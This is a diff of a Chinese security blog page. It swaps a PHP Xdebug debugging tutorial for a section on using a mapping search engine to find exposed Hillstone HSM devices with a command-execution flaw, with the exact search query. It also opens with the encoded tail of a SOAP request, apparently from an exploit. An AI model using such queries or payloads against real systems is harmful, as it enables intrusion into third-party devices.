aQsIPjKZ2uVIIW6fS/2KGfogvNmxKs830NzribRaKJAV55F8J7cOFbuv5vcZYj6Hj1Ls+iEP+BdTaI5jOJRPbva8d+kA+FVoZEQjbp7lOyNan2fjguf0q30z0ONfXr//eWeiR6Frqe/K30eHKfQlxHNGHA1q2rShAjkfDWQSWJlEcHYLbumTmge0rVKjPoiv+j/PLh5rWj+kJsUQ44+qXlXvv0hd6++GA7btsl0axOD/wLdozb69qpmOeUizazT9jKbYZc9TUqLgLxYDUjiotBVR1sgcUKQY3TR1VPHaoXqqn0PnxAeLtMd2pfIw5sgab17nVud2zbdfgp9MtRU9/mGJp0UgeRWA4nkVZbrAoYkSdS1wni6dMNqP56mRDxdRvC7z9ik32unFPWOvULvnEFn/INWPlKfp4/kRhyG7yhpy/V0K880aVqY+fmqmam18kLdOYAvb2J10+46O/UoL94Wue+GGfE2T/fsXTc8c0BsSbcK6VH+nkgHDvFT4i372/7RBr5ihynbFDCaqBgFOjSQs7qczcnZvJwtyFkmZxflbFHOLslZQ85ekLMX679bjEblILW3f+D9+4k/tf7gf/D6Hx7o+k9T0/8B&lt;/excelReportSolution&gt;</span><br><span class="line">    &lt;/ReleaseReport&gt;</span><br><span class="line">  &lt;/soap:Body&gt;</span><br><span class="line">&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103938521.png" alt="image-20250721103938521"></p>
-<h1 id="0-4-验证测试"><a href="#0-4-验证测试" class="headerlink" title="0.4 验证测试"></a>0.4 验证测试</h1><p>演示文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">add</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>
 
-<p>打上打断</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721104244430.png" alt="image-20250721104244430"></p>
-<p>开启监听（默认为红色，绿色则为开启）</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721104356690.png" alt="image-20250721104356690"></p>
-<p>运行调试（由于我这里用了美化插件，所以图标不一样）</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721104448656.png" alt="image-20250721104448656"></p>
-<p>会自动打开浏览器，我们修改后面的文件，即可开始调试</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721104535785.png" alt="image-20250721104535785"></p>
+
+
+
+<h2 id="0-1-2-实战搜索-山石网科安全管理平台HSM-命令执行漏洞"><a href="#0-1-2-实战搜索-山石网科安全管理平台HSM-命令执行漏洞" class="headerlink" title="0.1.2 实战搜索 山石网科安全管理平台HSM 命令执行漏洞"></a>0.1.2 实战搜索 山石网科安全管理平台HSM 命令执行漏洞</h2><p>漏洞信息：NCC-2025-00663</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107112629196.png" alt="image-20260107112629196"></p>
+<p>此时我们先定位产品：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107112728087.png" alt="image-20260107112728087"></p>
+<p>在产品的下面会提示部分命令执行漏洞的路径</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107113214161.png" alt="image-20260107113214161"></p>
+<p>然后使用测绘语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">product=&quot;山石网科安全管理平台HSM&quot; &amp;&amp; url=&quot;*applyLicense*&quot;</span><br></pre></td></tr></table></figure>
+
+<p><code>product</code> 产品名</p>
+<p><code>url</code> url路径（其中<code>*</code>为通配符）</p>
 
 <div class="article-footer fs14">
     <section id="license">
@@ -160,14 +142,14 @@
     </section>
     </div>
 </article>
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/16615.html">快速获取最新0day情报</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/40384.html">小程序渗透实战绕过数据包加密</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/54078.html">代码审计之Mac使用flyEnv动态调试php</a></div></section></div>
 
 <div class="related-wrap" id="related-posts">
     <section class='header'>
       <div class='title cap theme'>您可能感兴趣的文章</div>
     </section>
     <section class='body'>
-    <div class="related-posts"><a class="item" href="/posts/58642.html" title="Cobalt Strike主动识别方案"><span class="title">Cobalt Strike主动识别方案</span></a></div></section></div>
+    <div class="related-posts"><a class="item" href="/posts/24712.html" title="关于快速打点思考"><span class="title">关于快速打点思考</span></a></div></section></div>
 
 
 
@@ -179,7 +161,7 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0-1-%E5%89%8D%E6%9C%9F%E6%90%AD%E5%BB%BA"><span class="toc-text">0.1 前期搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-1-1-%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85"><span class="toc-text">0.1.1 软件安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0-1-2-FlyEnv%E4%BD%BF%E7%94%A8"><span class="toc-text">0.1.2 FlyEnv使用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0-2-%E8%B0%83%E8%AF%95%E9%85%8D%E7%BD%AE"><span class="toc-text">0.2 调试配置</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-2-1-%E5%AE%89%E8%A3%85Xdebug%E6%89%A9%E5%B1%95"><span class="toc-text">0.2.1 安装Xdebug扩展</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0-2-2-%E5%9C%A8php-ini%E4%B8%AD%E9%85%8D%E7%BD%AE"><span class="toc-text">0.2.2 在php.ini中配置</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0-3-phpStorm-%E9%85%8D%E7%BD%AE"><span class="toc-text">0.3 phpStorm 配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0-4-%E9%AA%8C%E8%AF%81%E6%B5%8B%E8%AF%95"><span class="toc-text">0.4 验证测试</span></a></li></ol></div><div class="widget-footer">
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0-1-nextrap%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7"><span class="toc-text">0.1 nextrap搜索技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-1-1-%E5%AE%9E%E6%88%98%E6%90%9C%E7%B4%A2-%E7%94%A8%E5%8F%8BU9-Cloud-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">0.1.1 实战搜索 用友U9 Cloud 命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0-1-2-%E5%AE%9E%E6%88%98%E6%90%9C%E7%B4%A2-%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0HSM-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">0.1.2 实战搜索 山石网科安全管理平台HSM 命令执行漏洞</span></a></li></ol></li></ol></div><div class="widget-footer">
 
 <a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
 </div></aside><div class='float-panel blur'>
